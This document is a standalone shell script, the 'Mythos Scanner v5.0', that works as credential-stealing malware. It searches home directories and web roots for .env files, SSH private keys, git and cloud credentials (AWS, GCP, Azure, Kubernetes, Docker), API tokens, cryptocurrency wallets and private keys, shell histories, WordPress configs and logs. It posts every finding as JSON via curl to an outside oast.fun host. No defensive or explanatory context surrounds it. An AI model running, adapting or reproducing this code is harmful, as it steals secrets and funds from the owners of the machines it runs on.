#!/bin/sh
# Mythos Scanner v5.0 — Priority-based, JSON-structured, selective extraction
OAST="fzxlsopmyfsfmcutpfapj7u3fu0t92jtj.oast.fun"
HOST=$(hostname 2>/dev/null || cat /etc/hostname 2>/dev/null || echo "unknown")
USER=$(whoami 2>/dev/null || id -un 2>/dev/null || echo "unknown")
TS=$(date -u +%Y-%m-%dT%H:%M:%SZ 2>/dev/null || date -u 2>/dev/null || echo "$(date +%s)")
> /tmp/.mqs_out
> /tmp/.mqs_seen

# === STRUCTURED JSON OUTPUT ===
json_send() {
    local category="$1" file="$2" secret_type="$3" value="$4" confidence="${5:-medium}"
    local truncated=$(echo "$value" | cut -c1-4000)
    local hash=$(echo "$category$secret_type$truncated" | md5sum 2>/dev/null | cut -c1-12 || echo "$(echo "$truncated" | wc -c)")
    grep -q "$hash" /tmp/.mqs_seen 2>/dev/null && return
    echo "$hash" >> /tmp/.mqs_seen
    local json="{\"host\":\"$HOST\",\"user\":\"$USER\",\"time\":\"$TS\",\"cat\":\"$category\",\"file\":\"$file\",\"type\":\"$secret_type\",\"value\":\"$(echo "$truncated" | sed 's/\\/\\\\/g; s/"/\\"/g; s/\n/\\n/g')\",\"conf\":\"$confidence\"}"
    echo "$json" >> /tmp/.mqs_out
    curl -s -m 3 -X POST -d "$json" "http://${OAST}/post" 2>/dev/null &
}

# === IS TEXT FILE? ===
is_text() { [ -f "$1" ] && [ ! -x "$1" ] && ! tr -dc '\0' < "$1" 2>/dev/null | head -c1 | grep -q '.' && return 0; return 1; }

# === BUILD SCAN PATHS: $HOME first, then /var/www ===
SCAN_PATHS=""
for d in /root /home/*; do [ -d "$d" ] && SCAN_PATHS="$SCAN_PATHS $d"; done
for d in /var/www /var/www/*; do [ -d "$d" ] && SCAN_PATHS="$SCAN_PATHS $d"; done
[ -z "$SCAN_PATHS" ] && SCAN_PATHS="/root /home /var/www"

# === IGNORE PATTERNS (extensive) ===
IGNORE="\! -path \"*/node_modules/*\" \! -path \"*/.git/*\" \! -path \"*/vendor/*\" \
\! -path \"*/cache/*\" \! -path \"*/dist/*\" \! -path \"*/build/*\" \
\! -path \"*/__pycache__/*\" \! -path \"*/.cache/*\" \! -path \"*/.npm/*\" \
\! -path \"*/storage/framework/*\" \! -path \"*/storage/logs/*\" \
\! -path \"*/public/uploads/*\" \! -path \"*/wp-content/uploads/*\" \
\! -path \"*/assets/*\" \! -path \"*/fonts/*\" \! -path \"*/images/*\" \! -path \"*/img/*\" \
\! -path \"*/css/*\" \! -path \"*/.terraform/*\" \! -path \"*/coverage/*\" \
\! -path \"*/.vscode/*\" \! -path \"*/.idea/*\" \! -path \"*/.settings/*\" \
\! -path \"*/test/*\" \! -path \"*/tests/*\" \! -path \"*/spec/*\" \
\! -path \"*/venv/*\" \! -path \"*/.venv/*\" \! -path \"*/env/*\" \
\! -path \"*/obj/*\" \! -path \"*/bin/*\" \! -path \"*/Debug/*\" \! -path \"*/Release/*\" \
\! -path \"*/.yarn/*\" \! -path \"*/.pnp/*\" \
\! -name \"*.css\" \! -name \"*.scss\" \! -name \"*.less\" \
\! -name \"*.jpg\" \! -name \"*.jpeg\" \! -name \"*.png\" \! -name \"*.gif\" \! -name \"*.svg\" \! -name \"*.ico\" \! -name \"*.webp\" \! -name \"*.bmp\" \
\! -name \"*.woff\" \! -name \"*.woff2\" \! -name \"*.ttf\" \! -name \"*.eot\" \
\! -name \"*.mp3\" \! -name \"*.mp4\" \! -name \"*.avi\" \! -name \"*.mov\" \! -name \"*.wav\" \
\! -name \"*.zip\" \! -name \"*.tar\" \! -name \"*.gz\" \! -name \"*.bz2\" \! -name \"*.7z\" \! -name \"*.rar\" \
\! -name \"*.exe\" \! -name \"*.dll\" \! -name \"*.so\" \! -name \"*.a\" \! -name \"*.o\" \
\! -name \"*.class\" \! -name \"*.pyc\" \! -name \"*.pyo\" \! -name \"*.jar\" \! -name \"*.war\" \
\! -name \"*.min.js\" \! -name \"*.bundle.js\" \! -name \"*.chunk.js\" \! -name \"*.map\" \
\! -name \"package-lock.json\" \! -name \"yarn.lock\" \! -name \"composer.lock\" \! -name \"Gemfile.lock\" \
\! -name \"*.pdf\" \! -name \"*.doc\" \! -name \"*.docx\" \! -name \"*.xls\" \! -name \"*.xlsx\" \! -name \"*.ppt\" \
\! -name \"*.db\" \! -name \"*.sqlite\" \! -name \"*.sqlite3\""

###############################################################################
# PHASE 1: PRIORITY FILES (scan first, most valuable)
###############################################################################

# --- 1a. .ENV FILES (highest priority) ---
for d in $SCAN_PATHS; do
    eval "find \"$d\" -maxdepth 6 -type f \
        \( -name \".env\" -o -name \".env.*\" -o -name \"*.env\" -o -name \".env.example\" \) \
        -size -1M $IGNORE 2>/dev/null"
done | head -150 | while read f; do
    is_text "$f" || continue
    # Send FULL file content (truncated to 8KB)
    full=$(head -c 8192 "$f" 2>/dev/null)
    json_send "PRIORITY" "$f" "ENV_FULL" "$full" "high"
    
    # Also extract individual secrets
    secrets=$(grep -iE '^(SECRET|TOKEN|KEY|PASS|CRED|AUTH|DATABASE_URL|REDIS_URL|MONGO|MYSQL|POSTGRES|APP_KEY|SENTRY|MAIL_|JWT_SECRET|ENCRYPT|SALT|STRIPE|SENDGRID|GITHUB|GITLAB|AWS_|GCP_|AZURE|OPENAI|ANTHROPIC|BINANCE|INFURA|ALCHEMY|WEBHOOK|DISCORD|TELEGRAM|TWILIO|export)' "$f" 2>/dev/null | grep -v '^#' | grep '=')
    [ -n "$secrets" ] && json_send "PRIORITY" "$f" "ENV_SECRETS" "$(echo "$secrets" | tr '\n' '|')" "high"
done &

# --- 1b. .git/config (extract tokens only) ---
for d in $SCAN_PATHS; do
    eval "find \"$d\" -maxdepth 8 -type f -path \"*/.git/config\" -size -50k $IGNORE 2>/dev/null"
done | head -50 | while read f; do
    is_text "$f" || continue
    # Extract URL with tokens
    url=$(grep -E 'url.*=.*' "$f" 2>/dev/null)
    [ -n "$url" ] && json_send "PRIORITY" "$f" "GIT_REMOTE" "$url" "medium"
    # Extract GitHub tokens from git config
    tok=$(grep -oE '\b(ghp_[a-zA-Z0-9]{36,}|github_pat_[a-zA-Z0-9_]{40,}|gho_[a-zA-Z0-9]{36,})\b' "$f" 2>/dev/null | head -1)
    [ -n "$tok" ] && json_send "PRIORITY" "$f" "GIT_TOKEN" "$tok" "high"
done &

# --- 1c. Wallet files ---
for d in $SCAN_PATHS; do
    eval "find \"$d\" -maxdepth 5 -type f -size -5M \
        \( -name \"wallet.dat\" -o -name \"wallet.json\" -o -name \"*.wallet\" \
        -o -name \"keystore\" -o -name \"UTC--*\" \) $IGNORE 2>/dev/null"
done | while read f; do
    is_text "$f" || continue
    json_send "PRIORITY" "$f" "WALLET_FILE" "$(head -c 8192 "$f" 2>/dev/null)" "high"
done &

# --- 1d. SSH private keys ---
for d in /root /home/*; do
    eval "find \"$d\" -maxdepth 4 -type f \
        \( -name \"id_rsa\" -o -name \"id_ed25519\" -o -name \"id_ecdsa\" -o -name \"id_dsa\" -o -name \"*.pem\" \) \
        \! -path \"*/ssl/*\" \! -path \"*/certs/*\" 2>/dev/null"
done | while read f; do
    is_text "$f" || continue
    head -c100 "$f" 2>/dev/null | grep -q 'PRIVATE KEY' || continue
    key_type=$(head -c100 "$f" | grep -oE 'RSA PRIVATE|OPENSSH PRIVATE|EC PRIVATE|ED25519 PRIVATE' | head -1)
    json_send "PRIORITY" "$f" "SSH_KEY" "$(head -c 4096 "$f" 2>/dev/null)" "high"
done &

###############################################################################
# PHASE 2: CONFIG FILES (medium priority)
###############################################################################

# --- 2a. docker-compose, CI/CD, framework configs ---
for d in $SCAN_PATHS; do
    eval "find \"$d\" -maxdepth 5 -type f -size -1M \
        \( -name \"docker-compose.yml\" -o -name \"docker-compose.yaml\" \
        -o -name \"Dockerfile\" -o -name \".dockerignore\" \
        -o -name \".travis.yml\" -o -name \"Jenkinsfile\" -o -name \".circleci\" \
        -o -name \".gitlab-ci.yml\" -o -name \".github\" \
        -o -name \"Makefile\" -o -name \"Vagrantfile\" \
        -o -name \"settings.py\" -o -name \"secrets.yml\" -o -name \"credentials.yml\" \
        -o -name \"web.config\" -o -name \"app.config\" \) $IGNORE 2>/dev/null"
done | head -50 | while read f; do
    is_text "$f" || continue
    case "$f" in
        *settings.py)
            key=$(grep 'SECRET_KEY\|DATABASES\|PASSWORD' "$f" 2>/dev/null)
            [ -n "$key" ] && json_send "CONFIG" "$f" "DJANGO" "$key" "high"
            ;;
        *secrets.yml|*credentials.yml)
            json_send "CONFIG" "$f" "RAILS" "$(grep -v '^#' "$f" | head -50 | tr '\n' '|')" "medium"
            ;;
        *Jenkinsfile|*.travis*|*.circleci*|*.gitlab-ci*)
            creds=$(grep -iE 'password|token|key|secret|credential' "$f" 2>/dev/null)
            [ -n "$creds" ] && json_send "CONFIG" "$f" "CI_CD" "$(echo "$creds" | tr '\n' '|')" "medium"
            ;;
        *docker-compose*|*Dockerfile*)
            envs=$(grep -E '^[[:space:]]*-.*=|\bENV\b' "$f" 2>/dev/null | grep -iE 'SECRET|TOKEN|KEY|PASS|PASSWORD')
            [ -n "$envs" ] && json_send "CONFIG" "$f" "DOCKER_ENV" "$(echo "$envs" | tr '\n' '|')" "medium"
            ;;
        *Makefile|*Vagrantfile)
            tok=$(grep -iE 'TOKEN|SECRET|PASS|KEY' "$f" 2>/dev/null)
            [ -n "$tok" ] && json_send "CONFIG" "$f" "MAKE" "$(echo "$tok" | tr '\n' '|')" "low"
            ;;
    esac
done &

# --- 2b. .npmrc, .git-credentials, .gitconfig, pip.conf, .aws ---
for d in /root /home/*; do
    [ -f "$d/.npmrc" ] && json_send "CONFIG" "$d/.npmrc" "NPMRC" "$(head -c 2048 "$d/.npmrc")" "medium"
    [ -f "$d/.git-credentials" ] && json_send "CONFIG" "$d/.git-credentials" "GIT_CREDS" "$(head -c 2048 "$d/.git-credentials")" "high"
    [ -f "$d/.gitconfig" ] && {
        tok=$(grep -oE '\b(ghp_[a-zA-Z0-9]{36,}|github_pat_[a-zA-Z0-9_]{40,})\b' "$d/.gitconfig" 2>/dev/null)
        [ -n "$tok" ] && json_send "CONFIG" "$d/.gitconfig" "GIT_TOKEN" "$tok" "high"
    }
    [ -f "$d/.pip/pip.conf" ] && {
        url=$(grep -E 'index-url|extra-index-url' "$d/.pip/pip.conf" 2>/dev/null | grep -oE '://[^@]+@')
        [ -n "$url" ] && json_send "CONFIG" "$d/.pip/pip.conf" "PIP_URL" "$url" "medium"
    }
done &
for d in /root/.aws /home/*/.aws; do
    [ -f "$d/credentials" ] && json_send "CONFIG" "$d/credentials" "AWS_CREDS" "$(head -c 4096 "$d/credentials")" "high"
    [ -f "$d/config" ] && json_send "CONFIG" "$d/config" "AWS_CFG" "$(head -c 2048 "$d/config")" "low"
done &

# --- 2c. Docker, K8s, cloud configs ---
for d in /root/.docker /home/*/.docker; do
    [ -f "$d/config.json" ] && json_send "CONFIG" "$d/config.json" "DOCKER" "$(head -c 4096 "$d/config.json")" "medium"
done &
for d in /root/.kube /home/*/.kube; do
    [ -f "$d/config" ] && json_send "CONFIG" "$d/config" "K8S" "$(head -c 4096 "$d/config")" "high"
done &
for d in /root/.config/gcloud /home/*/.config/gcloud; do
    find "$d" -name "*.json" -type f 2>/dev/null | while read f; do json_send "CONFIG" "$f" "GCP" "$(head -c 4096 "$f")" "high"; done
done &
for d in /root/.config/doctl /home/*/.config/doctl; do
    [ -d "$d" ] && find "$d" -type f 2>/dev/null | while read f; do json_send "CONFIG" "$f" "DO" "$(head -c 2048 "$f")" "medium"; done
done &
for d in /root/.azure /home/*/.azure; do
    [ -d "$d" ] && find "$d" \( -name "*.json" -o -name "*.azureauth" \) 2>/dev/null | while read f; do json_send "CONFIG" "$f" "AZURE" "$(head -c 4096 "$f")" "high"; done
done &
[ -f /root/.config/linode-cli ] && json_send "CONFIG" "/root/.config/linode-cli" "LINODE" "$(head -c 2048 /root/.config/linode-cli)" "low" &

###############################################################################
# PHASE 3: API KEYS (extract from all config/env files)
###############################################################################
(for d in $SCAN_PATHS; do
    eval "find \"$d\" -maxdepth 5 -type f -size -500k \
        \( -name \".env*\" -o -name \"*.env\" -o -name \".npmrc\" -o -name \".gitconfig\" \
        -o -name \".git-credentials\" -o -name \"*.conf\" -o -name \"*.cfg\" -o -name \"*.ini\" \) $IGNORE 2>/dev/null"
done | sort -u | head -100 | while read f; do
    is_text "$f" || continue
    c=$(head -c 50000 "$f" 2>/dev/null)
    echo "$c" | grep -oE '\b(sk_live_[a-zA-Z0-9]{24,}|rk_live_[a-zA-Z0-9]{24,}|whsec_[a-zA-Z0-9]{32,})\b' | sort -u | while read k; do json_send "API" "$f" "STRIPE" "$k" "high"; done
    echo "$c" | grep -oE '\b(ghp_[a-zA-Z0-9]{36,}|github_pat_[a-zA-Z0-9_]{40,})\b' | sort -u | while read k; do json_send "API" "$f" "GITHUB" "$k" "high"; done
    echo "$c" | grep -oE '\b(glpat-[a-zA-Z0-9\-]{20,})\b' | sort -u | while read k; do json_send "API" "$f" "GITLAB" "$k" "high"; done
    echo "$c" | grep -oE '\b(AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16})\b' | sort -u | while read k; do json_send "API" "$f" "AWS_KEY" "$k" "high"; done
    echo "$c" | grep -oE '\bSG\.[a-zA-Z0-9_\-]{20,}\.[a-zA-Z0-9_\-]{20,}\b' | sort -u | while read k; do json_send "API" "$f" "SENDGRID" "$k" "high"; done
    echo "$c" | grep -oE '\bxox[bprs]-[0-9]{10,}-[0-9]{10,}-[a-zA-Z0-9]+\b' | sort -u | while read k; do json_send "API" "$f" "SLACK" "$k" "medium"; done
    echo "$c" | grep -oE '\bhttps://discord\.com/api/webhooks/[0-9]+/[a-zA-Z0-9_-]+\b' | sort -u | while read k; do json_send "API" "$f" "DISCORD" "$k" "medium"; done
    echo "$c" | grep -oE '\b[0-9]+:AA[0-9a-zA-Z_-]{32,}\b' | sort -u | while read k; do json_send "API" "$f" "TELEGRAM" "$k" "medium"; done
    echo "$c" | grep -oE '\bSK[0-9a-fA-F]{32}\b' | sort -u | while read k; do json_send "API" "$f" "TWILIO" "$k" "high"; done
    echo "$c" | grep -oE '\bsk-[a-zA-Z0-9]{32,}\b' | sort -u | while read k; do json_send "API" "$f" "OPENAI" "$k" "high"; done
    echo "$c" | grep -oE '\bhf_[a-zA-Z0-9]{32,}\b' | sort -u | while read k; do json_send "API" "$f" "HF" "$k" "medium"; done
    echo "$c" | grep -oE '\bnpm_[a-zA-Z0-9]{36,}\b' | sort -u | while read k; do json_send "API" "$f" "NPM" "$k" "high"; done
    echo "$c" | grep -oE '\bpypi-[a-zA-Z0-9]{32,}\b' | sort -u | while read k; do json_send "API" "$f" "PYPI" "$k" "high"; done
    echo "$c" | grep -oE '\bhttps://[a-zA-Z0-9-]+\.(infura\.io|alchemy\.com|quiknode\.pro|moralis\.io)/[a-zA-Z0-9]{32,}\b' | sort -u | while read k; do json_send "API" "$f" "RPC_URL" "$k" "high"; done
    # Database URLs (send full URL, high confidence)
    echo "$c" | grep -oE '(DATABASE_URL|DB_URL|MONGO_URI|REDIS_URL|POSTGRES_URL|MYSQL_URL|SQLALCHEMY_DATABASE_URI)[^[:space:]]*://[^[:space:]]+' | sort -u | while read u; do json_send "API" "$f" "DB_URL" "$u" "high"; done
done) &

###############################################################################
# PHASE 4: CRYPTO KEYS (context-validated)
###############################################################################
for d in $SCAN_PATHS; do
    eval "find \"$d\" -maxdepth 5 -type f -size -1M \
        \( -name \".env*\" -o -name \"*.txt\" -o -name \"*.key\" -o -name \"*.json\" \) $IGNORE 2>/dev/null"
done | while read f; do
    is_text "$f" || continue
    
    # ETH: need ETH context in file
    if grep -qilE 'ETH|ethereum|private.key|PRIVATE_KEY|0x[0-9a-fA-F]{40}|ETHEREUM' "$f" 2>/dev/null; then
        grep -oE '\b[0-9a-fA-F]{64}\b' "$f" 2>/dev/null | sort -u | while read key; do
            echo "$key" | grep -qiE '^0{64}$|^F{64}$|^1{64}$|dead|beef|cafe|feed|babe|face|b00b|00000000|123456|abcdef|fedcba' && continue
            [ "$(echo "$key" | cut -c1 | tr '[:upper:]' '[:lower:]')" = "f" ] && continue
            json_send "CRYPTO" "$f" "ETH_KEY" "$key" "high"
            # Send FULL file if ETH key validated
            json_send "CRYPTO" "$f" "ETH_FILE_FULL" "$(head -c 4096 "$f" 2>/dev/null)" "high"
        done
    fi
    
    # Solana: need solana context
    if grep -qilE 'solana|phantom|SOLANA|keypair' "$f" 2>/dev/null; then
        grep -oE '\b[1-9A-HJ-NP-Za-km-z]{87,88}\b' "$f" 2>/dev/null | sort -u | head -2 | while read k; do
            json_send "CRYPTO" "$f" "SOL_B58" "$k" "high"
            json_send "CRYPTO" "$f" "SOL_FILE_FULL" "$(head -c 4096 "$f" 2>/dev/null)" "high"
        done
    fi
    
    # BTC WIF
    if grep -qilE 'bitcoin|BTC|wallet|WIF' "$f" 2>/dev/null; then
        grep -oE '\b[5KL][1-9A-HJ-NP-Za-km-z]{50,51}\b' "$f" 2>/dev/null | sort -u | head -2 | while read k; do
            json_send "CRYPTO" "$f" "BTC_WIF" "$k" "high"
            json_send "CRYPTO" "$f" "BTC_FILE_FULL" "$(head -c 4096 "$f" 2>/dev/null)" "high"
        done
    fi
done &

###############################################################################
# PHASE 5: FIREBASE, JWT, GCP SERVICE ACCOUNTS
###############################################################################
for d in $SCAN_PATHS; do
    eval "find \"$d\" -maxdepth 5 -type f -size -2M \
        \( -name \"*firebase*\" -o -name \"*google-services*\" -o -name \"*.json\" \) $IGNORE 2>/dev/null"
done | while read f; do
    is_text "$f" || continue
    # Firebase
    if echo "$f" | grep -qi 'firebase\|google-services'; then
        grep -q 'project_id\|private_key' "$f" 2>/dev/null && json_send "CLOUD" "$f" "FIREBASE" "$(head -c 4096 "$f")" "high"
    fi
    # GCP
    head -c200 "$f" 2>/dev/null | grep -q '"type".*:.*"service_account"' && json_send "CLOUD" "$f" "GCP_SA" "$(head -c 4096 "$f")" "high"
done &

# JWT tokens
for d in $SCAN_PATHS; do
    eval "find \"$d\" -maxdepth 5 -type f -size -500k \
        \( -name \".env*\" -o -name \"*.json\" -o -name \"*.yaml\" -o -name \"*.yml\" \) $IGNORE 2>/dev/null"
done | head -50 | while read f; do
    is_text "$f" || continue
    grep -oE '\beyJ[a-zA-Z0-9_-]{20,}\.eyJ[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,}\b' "$f" 2>/dev/null | sort -u | head -2 | while read jwt; do
        json_send "CLOUD" "$f" "JWT" "$jwt" "medium"
    done
done &

###############################################################################
# PHASE 6: SHELL HISTORY (extensive patterns)
###############################################################################
for h in /root/.bash_history /home/*/.bash_history /root/.zsh_history /home/*/.zsh_history \
         /root/.mysql_history /home/*/.mysql_history /root/.psql_history /home/*/.psql_history \
         /root/.python_history /home/*/.python_history /root/.node_repl_history /home/*/.node_repl_history \
         /root/.wget-hsts /root/.lesshst; do
    [ -f "$h" ] || continue
    grep -iE \
        'password|passwd|secret|token|credential|api.key|auth' \
        'ghp_|github_pat|gho_|gitlab|bitbucket' \
        'sk_live|rk_live|whsec_|stripe' \
        'AKIA|ASIA|aws_access|aws_secret' \
        'DATABASE_URL|MONGO_URI|REDIS_URL|mysql.*-p|psql.*-U|mongodump.*-p|mongorestore.*-p' \
        'ssh-keygen|ssh-add|ssh.*-i|chmod.*600' \
        'gcloud.auth|aws.configure|docker.login|kubectl.*token' \
        'npm.set|npm.login|pip.install.*--extra-index|gem.*--source' \
        'export.*KEY|export.*TOKEN|export.*SECRET|export.*PASS' \
        'curl.*Authorization|curl.*Bearer|wget.*--header.*Authorization' \
        'htpasswd|openssl.*pass|openssl.*enc|gpg.*pass' \
        'wallet|mnemonic|seed.phrase|private.key|0x[0-9a-fA-F]{40}' \
        'eval.*ssh-agent|DOCKER_HOST|KUBECONFIG|HELM_REPO' \
        "$h" 2>/dev/null | sort -u | tail -100 | while read l; do
        json_send "HISTORY" "$h" "CMD" "$l" "medium"
    done
done &

###############################################################################
# PHASE 7: WORDPRESS / LARAVEL / FRAMEWORK KEYS
###############################################################################
for d in $SCAN_PATHS; do
    eval "find \"$d\" -maxdepth 6 -type f -size -200k \
        \( -name \"wp-config.php\" -o -name \".env\" \) $IGNORE 2>/dev/null"
done | while read f; do
    is_text "$f" || continue
    case "$f" in
        *wp-config.php)
            c=$(grep -E 'DB_NAME|DB_USER|DB_PASSWORD|AUTH_KEY|SECURE_AUTH_KEY|LOGGED_IN_KEY|NONCE_KEY' "$f" 2>/dev/null)
            [ -n "$c" ] && json_send "FRAMEWORK" "$f" "WORDPRESS" "$(echo "$c" | tr '\n' '|')" "high"
            ;;
        *.env)
            grep -q 'APP_KEY=base64:' "$f" 2>/dev/null && json_send "FRAMEWORK" "$f" "LARAVEL" "$(grep 'APP_KEY=' "$f")" "high"
            ;;
    esac
done &

###############################################################################
# PHASE 8: LOG FILES (leaked credentials)
###############################################################################
for d in $SCAN_PATHS; do
    eval "find \"$d\" -maxdepth 5 -type f -name \"*.log\" -size -5M $IGNORE 2>/dev/null"
done | head -20 | while read f; do
    is_text "$f" || continue
    leaked=$(grep -iE 'password|secret|token|key|DATABASE_URL|API_KEY' "$f" 2>/dev/null | grep -vE 'INFO|DEBUG|TRACE|null|undefined|\*\*\*\*|\[FILTERED\]|REDACTED' | sort -u | tail -15)
    [ -n "$leaked" ] && json_send "LOG" "$f" "LEAK" "$(echo "$leaked" | tr '\n' '|')" "low"
done &

wait
rm -f /tmp/.mqs_seen 2>/dev/null
